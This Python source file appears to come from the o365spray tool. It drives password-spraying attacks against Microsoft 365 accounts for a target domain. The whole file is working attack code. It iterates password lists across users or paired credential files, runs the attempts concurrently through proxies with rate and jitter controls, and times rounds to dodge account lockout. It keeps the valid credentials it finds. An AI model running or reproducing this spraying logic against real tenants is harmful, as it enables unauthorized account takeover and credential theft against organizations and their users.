#!/usr/bin/env python3

import sys
import signal
import logging
import asyncio
import argparse
import importlib
from pathlib import Path
from o365spray.core.utils import (
    Defaults,
    Helper,
)


def spray(args: argparse.Namespace, output_dir: str, enum: object):
    """Run a password spray against a given domain.

    Arguments:
        args: namespace containing command line arguments
        output_dir: name of output directory to write results to
        enum: enumeration module instance

    Raises:
        KeyboardInterrupt: generic catch so that our signal handler
          can do its job
    """
    # Create spray directory
    output_directory = f"{output_dir}/spray/"
    Path(output_directory).mkdir(parents=True, exist_ok=True)

    loop = asyncio.get_event_loop()

    # Support both password(s) and a password file being provided
    passlist = []
    if args.password:
        passlist += args.password.split(",")
    if args.passfile:
        passlist += Helper.get_list_from_file(args.passfile)

    # Use validated users if enumeration was run
    if args.enum:
        userlist = enum.VALID_ACCOUNTS
        # Sleep before spraying when enumeration that uses authentication
        # was used
        if args.enum_module in ["activesync", "oauth2"]:
            logging.info(
                "User enumeration using authentication was run. "
                "Resetting lockout before password spraying."
            )
            logging.info("Sleeping for %.1f minutes" % (args.lockout))
            Helper.lockout_reset_wait(args.lockout)

    # Handle username:password files
    elif args.paired:
        paired_dict = Helper.get_paired_dict_from_file(args.paired)
        paired_max_pass = Helper.get_max_dict_elem(paired_dict)
        # Set this to the paired usernames, this will be reset when
        # paired spraying runs
        userlist = paired_dict.keys()

    else:
        # Support both username(s) and a username file being provided
        userlist = []
        if args.username:
            userlist += args.username.split(",")
        if args.userfile:
            userlist += Helper.get_list_from_file(args.userfile)

    # Validate we have a scope of users to spray
    if len(userlist) < 1:
        logging.error("No users provided to run a password spray against.")
        return

    logging.info("Running password spray against %d users." % len(userlist))

    # Attempt to import the defined module
    module = f"o365spray.core.handlers.sprayer.modules.{args.spray_module}"
    module_class = f"SprayModule_{args.spray_module}"

    try:
        Sprayer = getattr(importlib.import_module(module), module_class)
    except Exception as e:
        logging.error(f"ERROR: Invalid module\n{e}")
        return None

    spray = Sprayer(
        loop=loop,
        domain=args.domain,
        userlist=userlist,
        output_dir=output_directory,
        timeout=args.timeout,
        proxy=args.proxy,
        workers=args.rate,
        lock_threshold=args.safe,
        adfs_url=args.adfs_url,
        writer=True,
        sleep=args.sleep,
        jitter=args.jitter,
    )

    def spray_signal_handler(signal, frame):
        """Signal handler for Spray routines.

        Arguments:
            signal: invoked signal
            frame: stack frame
        """
        spray.shutdown(key=True)
        print(Defaults.ERASE_LINE, end="\r")
        logging.info("\n")  # Blank line
        logging.info("Valid Credentials: %d" % (len(spray.VALID_CREDENTIALS)))
        sys.exit(0)

    # Add signal handler to handle ctrl-c interrupts
    signal.signal(signal.SIGINT, spray_signal_handler)
    signal.signal(signal.SIGTERM, spray_signal_handler)

    try:
        if args.paired:
            logging.info("Password spraying using paired usernames:passwords.")

            # Track the current password index
            count = 0

            # Loop over our paired data set until we have reached the end of
            # the longest password list
            while count < paired_max_pass:
                count += 1
                userlist, passlist = [], []

                # Loop over the users in our data set and create a new userlist
                # and passlist each time
                for username, passwords in paired_dict.items():
                    if len(passwords) >= count:
                        userlist.append(username)
                        passlist.append(passwords[count - 1])

                logging.info(f"Password spraying {len(userlist)} paired accounts.")

                loop.run_until_complete(
                    spray.run(
                        password=passlist,
                        userlist=userlist,
                    )
                )

                # Catch exit handler from within spray class
                if spray.exit:
                    break

                # Flush the open files after each rotation
                if spray.writer:
                    spray.valid_writer.flush()
                    spray.tested_writer.flush()

                # Stop if we hit our locked account limit
                if spray.lockout >= args.safe:
                    logging.error("Locked account threshold reached. Exiting...")
                    break

                # Since we are maintaining the list of users to test here and not
                # in the spray class, we need to handle found valid creds here
                for valid_creds in spray.VALID_CREDENTIALS:
                    valid_email, _ = valid_creds.split(":", 1)
                    valid_user = valid_email.split("@", 1)[0]

                    # If the email/user exists in the paired dict still, attempt
                    # to remove it from further iterations
                    if any(
                        uname in paired_dict.keys()
                        for uname in [valid_email, valid_user]
                    ):
                        paired_dict.pop(valid_email, None)
                        paired_dict.pop(valid_user, None)
                        # If we found new creds and updated our spraying dict, let's
                        # update our counter
                        paired_max_pass = Helper.get_max_dict_elem(paired_dict)

                # Stop if there are no more users to spray
                if not spray.userlist:
                    logging.debug("End of password spraying user list reached.")
                    break

                # Check if we have reached the end of our paired data set
                if count < paired_max_pass:
                    Helper.lockout_reset_wait(args.lockout)
                else:
                    break

        else:
            for password_chunk in Helper.get_chunks_from_list(passlist, args.count):
                logging.info(
                    "Password spraying the following passwords: [%s]"
                    % (", ".join("'%s'" % password for password in password_chunk))
                )

                # Loop through each password individually so it's easier to keep track and
                # avoid duplicate scans once a removal condition is hit
                for password in password_chunk:
                    loop.run_until_complete(spray.run(password))

                    # Catch exit handler from within spray class
                    if spray.exit:
                        break

                    # Flush the open files after each rotation
                    if spray.writer:
                        spray.valid_writer.flush()
                        spray.tested_writer.flush()

                    # Stop if we hit our locked account limit
                    # Note: This currently only applies to the oauth2 spraying module as
                    #       Autodiscover is currently showing invalid lockouts
                    if spray.lockout >= args.safe:
                        logging.error("Locked account threshold reached. Exiting...")
                        break

                    # Stop if there are no more users to spray
                    if not spray.userlist:
                        logging.debug("End of password spraying user list reached.")
                        break

                # https://stackoverflow.com/a/654002
                # https://docs.python.org/3/tutorial/controlflow.html#break-and-continue-statements-and-else-clauses-on-loops
                # Only executed if the inner loop did NOT break
                else:
                    # Check if we reached the last password chunk
                    if not Helper.check_last_chunk(password_chunk, passlist):
                        Helper.lockout_reset_wait(args.lockout)
                    continue

                # Only executed if the inner loop DID break
                break

        # Gracefully shutdown if it triggered internally
        if not spray.exit:
            spray.shutdown()
        logging.info("Valid Credentials: %d" % (len(spray.VALID_CREDENTIALS)))

        loop.run_until_complete(asyncio.sleep(0.250))
        loop.close()

    except KeyboardInterrupt:
        pass
